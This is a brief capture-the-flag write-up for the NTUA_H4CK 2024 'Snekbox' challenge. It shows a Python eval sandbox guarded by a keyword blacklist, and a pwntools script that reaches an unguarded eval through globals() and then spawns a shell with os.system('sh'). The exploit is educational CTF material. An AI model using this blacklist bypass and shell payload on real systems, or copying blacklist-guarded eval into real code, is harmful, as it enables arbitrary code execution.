# NTUA_H4CK 2024 Snekbox

```python
# unsafe (example of what not to do)
def unsafe_eval():
    inp = input("> ")
    eval(inp)

# 100% safe
BLACKLIST = ["builtins", "import", "=", "flag", ';', "print", "_", "open", "exec", "eval", "help", "br"]
def safe_eval():
    inp = input("> ")
    if any(banned in inp for banned in BLACKLIST) or any(ord(c) >= 128 for c in inp):
        print('bye')
        exit()
    eval(inp)

safe_eval()
```

Requirements:

1. No non-ascii characters
2. Blacklisted dangerous functions: Use `globals()[function_name]` to bypass

Attack script:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "snekbox.py"])
# list(globals[])[-3] is unsafe_eval
p.sendline(b"globals()[list(globals())[-3]]()")
# enter unsafe_eval
# get shell
p.sendline(b"__import__('os').system('sh')")
p.interactive()
```
